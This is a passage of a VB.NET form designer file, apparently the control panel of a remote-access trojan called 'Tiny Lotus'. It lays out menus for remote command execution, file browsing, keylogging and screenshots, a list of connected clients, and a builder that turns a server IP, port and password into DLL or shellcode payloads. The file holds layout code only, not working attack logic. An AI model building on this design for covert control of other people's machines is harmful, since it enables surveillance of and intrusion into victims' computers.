<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()>
Partial Class frmmain
    Inherits System.Windows.Forms.Form

    'Form overrides dispose to clean up the component list.
    <System.Diagnostics.DebuggerNonUserCode()>
    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
        Try
            If disposing AndAlso components IsNot Nothing Then
                components.Dispose()
            End If
        Finally
            MyBase.Dispose(disposing)
        End Try
    End Sub

    'Required by the Windows Form Designer
    Private components As System.ComponentModel.IContainer

    'NOTE: The following procedure is required by the Windows Form Designer
    'It can be modified using the Windows Form Designer.  
    'Do not modify it using the code editor.
    <System.Diagnostics.DebuggerStepThrough()>
    Private Sub InitializeComponent()
        Me.components = New System.ComponentModel.Container()
        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(frmmain))
        Me.tmThread = New System.Windows.Forms.Timer(Me.components)
        Me.ctxMenu = New System.Windows.Forms.ContextMenuStrip(Me.components)
        Me.ToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.RemoteCMDToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.FileExplorerToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.SurveillanceToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.KeyloggerToolStripMenuItem1 = New System.Windows.Forms.ToolStripMenuItem()
        Me.ScreenshotToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.NetworkToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.PluginsToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ClientToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.CloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ForceCloseToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.TerminateToolStripMenuItem = New System.Windows.Forms.ToolStripMenuItem()
        Me.ImFlag = New System.Windows.Forms.ImageList(Me.components)
        Me.CrystalClearThemeContainer1 = New Server.CrystalClearThemeContainer()
        Me.cmdExit = New Server.CrystalClearButton()
        Me.CrystalClearTabControl1 = New Server.CrystalClearTabControl()
        Me.TabPage1 = New System.Windows.Forms.TabPage()
        Me.lvClient = New System.Windows.Forms.ListView()
        Me.TabPage2 = New System.Windows.Forms.TabPage()
        Me.GroupBox3 = New System.Windows.Forms.GroupBox()
        Me.cmdRemoveBlockIP = New Server.CrystalClearButton()
        Me.txtBlockIPAdd = New Server.CrystalClearButton()
        Me.txtBlockIP = New Server.CrystalClearTextBox()
        Me.lsBlockIP = New Server.CrystalClearListbox()
        Me.TabPage3 = New System.Windows.Forms.TabPage()
        Me.txtBuildLog = New Server.CrystalClearTextBox()
        Me.cmdBuild = New Server.CrystalClearButton()
        Me.GroupBox2 = New System.Windows.Forms.GroupBox()
        Me.cbBuildPlugin = New System.Windows.Forms.ComboBox()
        Me.opBuildCustom = New System.Windows.Forms.RadioButton()
        Me.opBuildShell = New System.Windows.Forms.RadioButton()
        Me.opBuildDll = New System.Windows.Forms.RadioButton()
        Me.GroupBox1 = New System.Windows.Forms.GroupBox()
        Me.Label3 = New System.Windows.Forms.Label()
        Me.Label2 = New System.Windows.Forms.Label()
        Me.Label1 = New System.Windows.Forms.Label()
        Me.txtPassword = New Server.CrystalClearTextBox()
        Me.txtBuildPort = New Server.CrystalClearTextBox()
        Me.txtBuildServer = New Server.CrystalClearTextBox()
        Me.TabPage4 = New System.Windows.Forms.TabPage()
        Me.txtLog = New System.Windows.Forms.TextBox()
        Me.TabPage5 = New System.Windows.Forms.TabPage()
        Me.txtAbout = New Server.CrystalClearTextBox()
        Me.picAbout = New System.Windows.Forms.PictureBox()
        Me.cmdListen = New Server.CrystalClearButton()
        Me.lbStatus = New System.Windows.Forms.Label()
        Me.ctxMenu.SuspendLayout()
        Me.CrystalClearThemeContainer1.SuspendLayout()
        Me.CrystalClearTabControl1.SuspendLayout()
        Me.TabPage1.SuspendLayout()
        Me.TabPage2.SuspendLayout()
        Me.GroupBox3.SuspendLayout()
        Me.TabPage3.SuspendLayout()
        Me.GroupBox2.SuspendLayout()
        Me.GroupBox1.SuspendLayout()
        Me.TabPage4.SuspendLayout()
        Me.TabPage5.SuspendLayout()
        CType(Me.picAbout, System.ComponentModel.ISupportInitialize).BeginInit()
        Me.SuspendLayout()
        '
        'tmThread
        '
        Me.tmThread.Interval = 1000
        '
        'ctxMenu
        '
        Me.ctxMenu.ImageScalingSize = New System.Drawing.Size(20, 20)
        Me.ctxMenu.Items.AddRange(New System.Windows.Forms.ToolStripItem() {Me.ToolStripMenuItem1, Me.SurveillanceToolStripMenuItem, Me.NetworkToolStripMenuItem, Me.PluginsToolStripMenuItem, Me.ClientToolStripMenuItem})
        Me.ctxMenu.Name = "ContextMenuStrip1"
        Me.ctxMenu.Size = New System.Drawing.Size(138, 114)
        '
        'ToolStripMenuItem1
        '
        Me.ToolStripMenuItem1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RemoteCMDToolStripMenuItem1, Me.FileExplorerToolStripMenuItem1})
        Me.ToolStripMenuItem1.Name = "ToolStripMenuItem1"
        Me.ToolStripMenuItem1.Size = New System.Drawing.Size(137, 22)
        Me.ToolStripMenuItem1.Text = "System"
        '
        'RemoteCMDToolStripMenuItem1
        '
        Me.RemoteCMDToolStripMenuItem1.Name = "RemoteCMDToolStripMenuItem1"
        Me.RemoteCMDToolStripMenuItem1.Size = New System.Drawing.Size(144, 22)
        Me.RemoteCMDToolStripMenuItem1.Text = "Remote Cmd"
        '
        'FileExplorerToolStripMenuItem1
        '
        Me.FileExplorerToolStripMenuItem1.Name = "FileExplorerToolStripMenuItem1"
        Me.FileExplorerToolStripMenuItem1.Size = New System.Drawing.Size(144, 22)
        Me.FileExplorerToolStripMenuItem1.Text = "File Explorer"
        '
        'SurveillanceToolStripMenuItem
        '
        Me.SurveillanceToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.KeyloggerToolStripMenuItem1, Me.ScreenshotToolStripMenuItem})
        Me.SurveillanceToolStripMenuItem.Name = "SurveillanceToolStripMenuItem"
        Me.SurveillanceToolStripMenuItem.Size = New System.Drawing.Size(137, 22)
        Me.SurveillanceToolStripMenuItem.Text = "Surveillance"
        '
        'KeyloggerToolStripMenuItem1
        '
        Me.KeyloggerToolStripMenuItem1.Name = "KeyloggerToolStripMenuItem1"
        Me.KeyloggerToolStripMenuItem1.Size = New System.Drawing.Size(132, 22)
        Me.KeyloggerToolStripMenuItem1.Text = "Keylogger"
        '
        'ScreenshotToolStripMenuItem
        '
        Me.ScreenshotToolStripMenuItem.Name = "ScreenshotToolStripMenuItem"
        Me.ScreenshotToolStripMenuItem.Size = New System.Drawing.Size(132, 22)
        Me.ScreenshotToolStripMenuItem.Text = "Screenshot"
        '
        'NetworkToolStripMenuItem
        '
        Me.NetworkToolStripMenuItem.Name = "NetworkToolStripMenuItem"
        Me.NetworkToolStripMenuItem.Size = New System.Drawing.Size(137, 22)
        Me.NetworkToolStripMenuItem.Text = "Network"
        '
        'PluginsToolStripMenuItem
        '
        Me.PluginsToolStripMenuItem.Name = "PluginsToolStripMenuItem"
        Me.PluginsToolStripMenuItem.Size = New System.Drawing.Size(137, 22)
        Me.PluginsToolStripMenuItem.Text = "Plugins"
        '
        'ClientToolStripMenuItem
        '
        Me.ClientToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseToolStripMenuItem, Me.ForceCloseToolStripMenuItem, Me.TerminateToolStripMenuItem})
        Me.ClientToolStripMenuItem.Name = "ClientToolStripMenuItem"
        Me.ClientToolStripMenuItem.Size = New System.Drawing.Size(137, 22)
        Me.ClientToolStripMenuItem.Text = "Client"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'ForceCloseToolStripMenuItem
        '
        Me.ForceCloseToolStripMenuItem.Name = "ForceCloseToolStripMenuItem"
        Me.ForceCloseToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.ForceCloseToolStripMenuItem.Text = "Force Close"
        '
        'TerminateToolStripMenuItem
        '
        Me.TerminateToolStripMenuItem.Name = "TerminateToolStripMenuItem"
        Me.TerminateToolStripMenuItem.Size = New System.Drawing.Size(135, 22)
        Me.TerminateToolStripMenuItem.Text = "Terminate"
        '
        'ImFlag
        '
        Me.ImFlag.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
        Me.ImFlag.ImageSize = New System.Drawing.Size(16, 11)
        Me.ImFlag.TransparentColor = System.Drawing.Color.Transparent
        '
        'CrystalClearThemeContainer1
        '
        Me.CrystalClearThemeContainer1.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.CrystalClearThemeContainer1.BorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.CrystalClearThemeContainer1.Controls.Add(Me.cmdExit)
        Me.CrystalClearThemeContainer1.Controls.Add(Me.CrystalClearTabControl1)
        Me.CrystalClearThemeContainer1.Controls.Add(Me.cmdListen)
        Me.CrystalClearThemeContainer1.Controls.Add(Me.lbStatus)
        Me.CrystalClearThemeContainer1.Customization = "5ubm/9LS0v/m5ub/5ubm/6qqqv8="
        Me.CrystalClearThemeContainer1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.CrystalClearThemeContainer1.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.CrystalClearThemeContainer1.Image = Nothing
        Me.CrystalClearThemeContainer1.Location = New System.Drawing.Point(0, 0)
        Me.CrystalClearThemeContainer1.MinimumSize = New System.Drawing.Size(175, 150)
        Me.CrystalClearThemeContainer1.Movable = True
        Me.CrystalClearThemeContainer1.Name = "CrystalClearThemeContainer1"
        Me.CrystalClearThemeContainer1.NoRounding = False
        Me.CrystalClearThemeContainer1.Rounding = Server.CrystalClearThemeContainer.RoundingType.None
        Me.CrystalClearThemeContainer1.Sizable = False
        Me.CrystalClearThemeContainer1.Size = New System.Drawing.Size(971, 494)
        Me.CrystalClearThemeContainer1.SmartBounds = True
        Me.CrystalClearThemeContainer1.StartPosition = System.Windows.Forms.FormStartPosition.WindowsDefaultLocation
        Me.CrystalClearThemeContainer1.TabIndex = 0
        Me.CrystalClearThemeContainer1.Text = "CrystalClearThemeContainer1"
        Me.CrystalClearThemeContainer1.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.CrystalClearThemeContainer1.Transparent = False
        '
        'cmdExit
        '
        Me.cmdExit.Customization = "5ubm/9LS0v/m5ub/qqqq/wAAAP//////"
        Me.cmdExit.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.cmdExit.Image = Nothing
        Me.cmdExit.Location = New System.Drawing.Point(936, 2)
        Me.cmdExit.Name = "cmdExit"
        Me.cmdExit.NoRounding = False
        Me.cmdExit.Size = New System.Drawing.Size(32, 20)
        Me.cmdExit.TabIndex = 1
        Me.cmdExit.Text = "X"
        Me.cmdExit.Transparent = False
        '
        'CrystalClearTabControl1
        '
        Me.CrystalClearTabControl1.Controls.Add(Me.TabPage1)
        Me.CrystalClearTabControl1.Controls.Add(Me.TabPage2)
        Me.CrystalClearTabControl1.Controls.Add(Me.TabPage3)
        Me.CrystalClearTabControl1.Controls.Add(Me.TabPage4)
        Me.CrystalClearTabControl1.Controls.Add(Me.TabPage5)
        Me.CrystalClearTabControl1.Location = New System.Drawing.Point(0, 32)
        Me.CrystalClearTabControl1.Name = "CrystalClearTabControl1"
        Me.CrystalClearTabControl1.SelectedIndex = 0
        Me.CrystalClearTabControl1.Size = New System.Drawing.Size(968, 432)
        Me.CrystalClearTabControl1.TabIndex = 0
        '
        'TabPage1
        '
        Me.TabPage1.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.TabPage1.Controls.Add(Me.lvClient)
        Me.TabPage1.ImageIndex = 2
        Me.TabPage1.Location = New System.Drawing.Point(4, 25)
        Me.TabPage1.Name = "TabPage1"
        Me.TabPage1.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage1.Size = New System.Drawing.Size(960, 403)
        Me.TabPage1.TabIndex = 0
        Me.TabPage1.Text = "Connection"
        '
        'lvClient
        '
        Me.lvClient.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.lvClient.HideSelection = False
        Me.lvClient.Location = New System.Drawing.Point(0, 0)
        Me.lvClient.Name = "lvClient"
        Me.lvClient.Size = New System.Drawing.Size(968, 400)
        Me.lvClient.TabIndex = 0
        Me.lvClient.UseCompatibleStateImageBehavior = False
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.GroupBox3)
        Me.TabPage2.ImageIndex = 1
        Me.TabPage2.Location = New System.Drawing.Point(4, 25)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(960, 403)
        Me.TabPage2.TabIndex = 1
        Me.TabPage2.Text = "Setting"
        '
        'GroupBox3
        '
        Me.GroupBox3.Controls.Add(Me.cmdRemoveBlockIP)
        Me.GroupBox3.Controls.Add(Me.txtBlockIPAdd)
        Me.GroupBox3.Controls.Add(Me.txtBlockIP)
        Me.GroupBox3.Controls.Add(Me.lsBlockIP)
        Me.GroupBox3.Location = New System.Drawing.Point(8, 6)
        Me.GroupBox3.Name = "GroupBox3"
        Me.GroupBox3.Size = New System.Drawing.Size(261, 391)
        Me.GroupBox3.TabIndex = 0
        Me.GroupBox3.TabStop = False
        Me.GroupBox3.Text = "Block IP"
        '
        'cmdRemoveBlockIP
        '
        Me.cmdRemoveBlockIP.Customization = "5ubm/9LS0v/m5ub/qqqq/wAAAP//////"
        Me.cmdRemoveBlockIP.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.cmdRemoveBlockIP.Image = Nothing
        Me.cmdRemoveBlockIP.Location = New System.Drawing.Point(56, 360)
        Me.cmdRemoveBlockIP.Name = "cmdRemoveBlockIP"
        Me.cmdRemoveBlockIP.NoRounding = False
        Me.cmdRemoveBlockIP.Size = New System.Drawing.Size(145, 25)
        Me.cmdRemoveBlockIP.TabIndex = 3
        Me.cmdRemoveBlockIP.Text = "Remove Block IP"
        Me.cmdRemoveBlockIP.Transparent = False
        '
        'txtBlockIPAdd
        '
        Me.txtBlockIPAdd.Customization = "5ubm/9LS0v/m5ub/qqqq/wAAAP//////"
        Me.txtBlockIPAdd.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtBlockIPAdd.Image = Nothing
        Me.txtBlockIPAdd.Location = New System.Drawing.Point(191, 27)
        Me.txtBlockIPAdd.Name = "txtBlockIPAdd"
        Me.txtBlockIPAdd.NoRounding = False
        Me.txtBlockIPAdd.Size = New System.Drawing.Size(64, 25)
        Me.txtBlockIPAdd.TabIndex = 2
        Me.txtBlockIPAdd.Text = "Add"
        Me.txtBlockIPAdd.Transparent = False
        '
        'txtBlockIP
        '
        Me.txtBlockIP.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtBlockIP.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtBlockIP.Image = Nothing
        Me.txtBlockIP.Location = New System.Drawing.Point(6, 27)
        Me.txtBlockIP.MaxLength = 32767
        Me.txtBlockIP.Multiline = False
        Me.txtBlockIP.Name = "txtBlockIP"
        Me.txtBlockIP.NoRounding = False
        Me.txtBlockIP.ReadOnly = False
        Me.txtBlockIP.Size = New System.Drawing.Size(179, 24)
        Me.txtBlockIP.TabIndex = 1
        Me.txtBlockIP.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtBlockIP.Transparent = False
        Me.txtBlockIP.UseSystemPasswordChar = False
        '
        'lsBlockIP
        '
        Me.lsBlockIP.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.lsBlockIP.BorderStyle = System.Windows.Forms.BorderStyle.None
        Me.lsBlockIP.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed
        Me.lsBlockIP.Font = New System.Drawing.Font("Microsoft Sans Serif", 9.0!)
        Me.lsBlockIP.ForeColor = System.Drawing.Color.Black
        Me.lsBlockIP.FormattingEnabled = True
        Me.lsBlockIP.IntegralHeight = False
        Me.lsBlockIP.ItemHeight = 21
        Me.lsBlockIP.ItemImage = Nothing
        Me.lsBlockIP.Location = New System.Drawing.Point(6, 57)
        Me.lsBlockIP.Name = "lsBlockIP"
        Me.lsBlockIP.Size = New System.Drawing.Size(249, 292)
        Me.lsBlockIP.TabIndex = 0
        '
        'TabPage3
        '
        Me.TabPage3.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.TabPage3.Controls.Add(Me.txtBuildLog)
        Me.TabPage3.Controls.Add(Me.cmdBuild)
        Me.TabPage3.Controls.Add(Me.GroupBox2)
        Me.TabPage3.Controls.Add(Me.GroupBox1)
        Me.TabPage3.Location = New System.Drawing.Point(4, 25)
        Me.TabPage3.Name = "TabPage3"
        Me.TabPage3.Size = New System.Drawing.Size(960, 403)
        Me.TabPage3.TabIndex = 2
        Me.TabPage3.Text = "Builder"
        '
        'txtBuildLog
        '
        Me.txtBuildLog.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtBuildLog.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtBuildLog.Image = Nothing
        Me.txtBuildLog.Location = New System.Drawing.Point(561, 10)
        Me.txtBuildLog.MaxLength = 32767
        Me.txtBuildLog.Multiline = True
        Me.txtBuildLog.Name = "txtBuildLog"
        Me.txtBuildLog.NoRounding = False
        Me.txtBuildLog.ReadOnly = True
        Me.txtBuildLog.Size = New System.Drawing.Size(394, 350)
        Me.txtBuildLog.TabIndex = 3
        Me.txtBuildLog.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtBuildLog.Transparent = False
        Me.txtBuildLog.UseSystemPasswordChar = False
        '
        'cmdBuild
        '
        Me.cmdBuild.Customization = "5ubm/9LS0v/m5ub/qqqq/wAAAP//////"
        Me.cmdBuild.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.cmdBuild.Image = Nothing
        Me.cmdBuild.Location = New System.Drawing.Point(690, 366)
        Me.cmdBuild.Name = "cmdBuild"
        Me.cmdBuild.NoRounding = False
        Me.cmdBuild.Size = New System.Drawing.Size(145, 25)
        Me.cmdBuild.TabIndex = 2
        Me.cmdBuild.Text = "Build"
        Me.cmdBuild.Transparent = False
        '
        'GroupBox2
        '
        Me.GroupBox2.Controls.Add(Me.cbBuildPlugin)
        Me.GroupBox2.Controls.Add(Me.opBuildCustom)
        Me.GroupBox2.Controls.Add(Me.opBuildShell)
        Me.GroupBox2.Controls.Add(Me.opBuildDll)
        Me.GroupBox2.Location = New System.Drawing.Point(8, 135)
        Me.GroupBox2.Name = "GroupBox2"
        Me.GroupBox2.Size = New System.Drawing.Size(542, 98)
        Me.GroupBox2.TabIndex = 1
        Me.GroupBox2.TabStop = False
        Me.GroupBox2.Text = "Builder Module"
        '
        'cbBuildPlugin
        '
        Me.cbBuildPlugin.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.cbBuildPlugin.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList
        Me.cbBuildPlugin.FormattingEnabled = True
        Me.cbBuildPlugin.Location = New System.Drawing.Point(26, 64)
        Me.cbBuildPlugin.Name = "cbBuildPlugin"
        Me.cbBuildPlugin.Size = New System.Drawing.Size(501, 21)
        Me.cbBuildPlugin.TabIndex = 3
        '
        'opBuildCustom
        '
        Me.opBuildCustom.AutoSize = True
        Me.opBuildCustom.Location = New System.Drawing.Point(6, 67)
        Me.opBuildCustom.Name = "opBuildCustom"
        Me.opBuildCustom.Size = New System.Drawing.Size(14, 13)
        Me.opBuildCustom.TabIndex = 2
        Me.opBuildCustom.UseVisualStyleBackColor = True
        '
        'opBuildShell
        '
        Me.opBuildShell.AutoSize = True
        Me.opBuildShell.Location = New System.Drawing.Point(6, 42)
        Me.opBuildShell.Name = "opBuildShell"
        Me.opBuildShell.Size = New System.Drawing.Size(129, 17)
        Me.opBuildShell.TabIndex = 1
        Me.opBuildShell.Text = "Build as Shellcode"
        Me.opBuildShell.UseVisualStyleBackColor = True
        '
        'opBuildDll
        '
        Me.opBuildDll.AutoSize = True
        Me.opBuildDll.Checked = True
        Me.opBuildDll.Location = New System.Drawing.Point(6, 19)
        Me.opBuildDll.Name = "opBuildDll"
        Me.opBuildDll.Size = New System.Drawing.Size(95, 17)
        Me.opBuildDll.TabIndex = 0
        Me.opBuildDll.TabStop = True
        Me.opBuildDll.Text = "Build as DLL"
        Me.opBuildDll.UseVisualStyleBackColor = True
        '
        'GroupBox1
        '
        Me.GroupBox1.Controls.Add(Me.Label3)
        Me.GroupBox1.Controls.Add(Me.Label2)
        Me.GroupBox1.Controls.Add(Me.Label1)
        Me.GroupBox1.Controls.Add(Me.txtPassword)
        Me.GroupBox1.Controls.Add(Me.txtBuildPort)
        Me.GroupBox1.Controls.Add(Me.txtBuildServer)
        Me.GroupBox1.Location = New System.Drawing.Point(8, 3)
        Me.GroupBox1.Name = "GroupBox1"
        Me.GroupBox1.Size = New System.Drawing.Size(542, 126)
        Me.GroupBox1.TabIndex = 0
        Me.GroupBox1.TabStop = False
        Me.GroupBox1.Text = "Server settings"
        '
        'Label3
        '
        Me.Label3.AutoSize = True
        Me.Label3.Location = New System.Drawing.Point(20, 83)
        Me.Label3.Name = "Label3"
        Me.Label3.Size = New System.Drawing.Size(61, 13)
        Me.Label3.TabIndex = 5
        Me.Label3.Text = "Password"
        '
        'Label2
        '
        Me.Label2.AutoSize = True
        Me.Label2.Location = New System.Drawing.Point(20, 53)
        Me.Label2.Name = "Label2"
        Me.Label2.Size = New System.Drawing.Size(30, 13)
        Me.Label2.TabIndex = 4
        Me.Label2.Text = "Port"
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.Location = New System.Drawing.Point(20, 23)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(49, 13)
        Me.Label1.TabIndex = 3
        Me.Label1.Text = "IP/DNS"
        '
        'txtPassword
        '
        Me.txtPassword.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtPassword.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtPassword.Image = Nothing
        Me.txtPassword.Location = New System.Drawing.Point(96, 79)
        Me.txtPassword.MaxLength = 32767
        Me.txtPassword.Multiline = False
        Me.txtPassword.Name = "txtPassword"
        Me.txtPassword.NoRounding = False
        Me.txtPassword.ReadOnly = False
        Me.txtPassword.Size = New System.Drawing.Size(431, 24)
        Me.txtPassword.TabIndex = 2
        Me.txtPassword.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtPassword.Transparent = False
        Me.txtPassword.UseSystemPasswordChar = False
        '
        'txtBuildPort
        '
        Me.txtBuildPort.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtBuildPort.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtBuildPort.Image = Nothing
        Me.txtBuildPort.Location = New System.Drawing.Point(96, 49)
        Me.txtBuildPort.MaxLength = 32767
        Me.txtBuildPort.Multiline = False
        Me.txtBuildPort.Name = "txtBuildPort"
        Me.txtBuildPort.NoRounding = False
        Me.txtBuildPort.ReadOnly = False
        Me.txtBuildPort.Size = New System.Drawing.Size(431, 24)
        Me.txtBuildPort.TabIndex = 1
        Me.txtBuildPort.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtBuildPort.Transparent = False
        Me.txtBuildPort.UseSystemPasswordChar = False
        '
        'txtBuildServer
        '
        Me.txtBuildServer.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtBuildServer.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtBuildServer.Image = Nothing
        Me.txtBuildServer.Location = New System.Drawing.Point(96, 19)
        Me.txtBuildServer.MaxLength = 32767
        Me.txtBuildServer.Multiline = False
        Me.txtBuildServer.Name = "txtBuildServer"
        Me.txtBuildServer.NoRounding = False
        Me.txtBuildServer.ReadOnly = False
        Me.txtBuildServer.Size = New System.Drawing.Size(431, 24)
        Me.txtBuildServer.TabIndex = 0
        Me.txtBuildServer.TextAlign = System.Windows.Forms.HorizontalAlignment.Left
        Me.txtBuildServer.Transparent = False
        Me.txtBuildServer.UseSystemPasswordChar = False
        '
        'TabPage4
        '
        Me.TabPage4.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.TabPage4.Controls.Add(Me.txtLog)
        Me.TabPage4.Location = New System.Drawing.Point(4, 25)
        Me.TabPage4.Name = "TabPage4"
        Me.TabPage4.Size = New System.Drawing.Size(960, 403)
        Me.TabPage4.TabIndex = 3
        Me.TabPage4.Text = "Log"
        '
        'txtLog
        '
        Me.txtLog.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.txtLog.Location = New System.Drawing.Point(3, 3)
        Me.txtLog.Multiline = True
        Me.txtLog.Name = "txtLog"
        Me.txtLog.ReadOnly = True
        Me.txtLog.ScrollBars = System.Windows.Forms.ScrollBars.Vertical
        Me.txtLog.Size = New System.Drawing.Size(952, 397)
        Me.txtLog.TabIndex = 0
        '
        'TabPage5
        '
        Me.TabPage5.BackColor = System.Drawing.Color.FromArgb(CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer), CType(CType(230, Byte), Integer))
        Me.TabPage5.Controls.Add(Me.txtAbout)
        Me.TabPage5.Controls.Add(Me.picAbout)
        Me.TabPage5.Location = New System.Drawing.Point(4, 25)
        Me.TabPage5.Name = "TabPage5"
        Me.TabPage5.Size = New System.Drawing.Size(960, 403)
        Me.TabPage5.TabIndex = 4
        Me.TabPage5.Text = "About"
        '
        'txtAbout
        '
        Me.txtAbout.Customization = "AAAA//Dw8P+qqqr/"
        Me.txtAbout.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.txtAbout.Image = Nothing
        Me.txtAbout.Location = New System.Drawing.Point(639, 3)
        Me.txtAbout.MaxLength = 32767
        Me.txtAbout.Multiline = True
        Me.txtAbout.Name = "txtAbout"
        Me.txtAbout.NoRounding = False
        Me.txtAbout.ReadOnly = True
        Me.txtAbout.Size = New System.Drawing.Size(318, 397)
        Me.txtAbout.TabIndex = 1
        Me.txtAbout.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
        Me.txtAbout.Transparent = False
        Me.txtAbout.UseSystemPasswordChar = False
        '
        'picAbout
        '
        Me.picAbout.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
        Me.picAbout.Image = CType(resources.GetObject("picAbout.Image"), System.Drawing.Image)
        Me.picAbout.Location = New System.Drawing.Point(3, 3)
        Me.picAbout.Name = "picAbout"
        Me.picAbout.Size = New System.Drawing.Size(628, 397)
        Me.picAbout.SizeMode = System.Windows.Forms.PictureBoxSizeMode.CenterImage
        Me.picAbout.TabIndex = 0
        Me.picAbout.TabStop = False
        '
        'cmdListen
        '
        Me.cmdListen.Customization = "5ubm/9LS0v/m5ub/qqqq/wAAAP//////"
        Me.cmdListen.Font = New System.Drawing.Font("Verdana", 8.0!)
        Me.cmdListen.Image = Nothing
        Me.cmdListen.Location = New System.Drawing.Point(184, 472)
        Me.cmdListen.Name = "cmdListen"
        Me.cmdListen.NoRounding = False
        Me.cmdListen.Size = New System.Drawing.Size(48, 16)
        Me.cmdListen.TabIndex = 6
        Me.cmdListen.Text = "Listen"
        Me.cmdListen.Transparent = False
        '
        'lbStatus
        '
        Me.lbStatus.AutoSize = True
        Me.lbStatus.Location = New System.Drawing.Point(4, 473)
        Me.lbStatus.Name = "lbStatus"
        Me.lbStatus.Size = New System.Drawing.Size(19, 13)
        Me.lbStatus.TabIndex = 5
        Me.lbStatus.Text = "..."
        '
        'frmmain
        '
        Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
        Me.ClientSize = New System.Drawing.Size(971, 494)
        Me.ControlBox = False
        Me.Controls.Add(Me.CrystalClearThemeContainer1)
        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
        Me.MinimumSize = New System.Drawing.Size(175, 150)
        Me.Name = "frmmain"
        Me.Text = "Tiny Lotus"
        Me.TransparencyKey = System.Drawing.Color.Fuchsia
        Me.ctxMenu.ResumeLayout(False)
        Me.CrystalClearThemeContainer1.ResumeLayout(False)
        Me.CrystalClearThemeContainer1.PerformLayout()
        Me.CrystalClearTabControl1.ResumeLayout(False)
        Me.TabPage1.ResumeLayout(False)
        Me.TabPage2.ResumeLayout(False)
        Me.GroupBox3.ResumeLayout(False)
        Me.TabPage3.ResumeLayout(False)
        Me.GroupBox2.ResumeLayout(False)
        Me.GroupBox2.PerformLayout()
        Me.GroupBox1.ResumeLayout(False)
        Me.GroupBox1.PerformLayout()
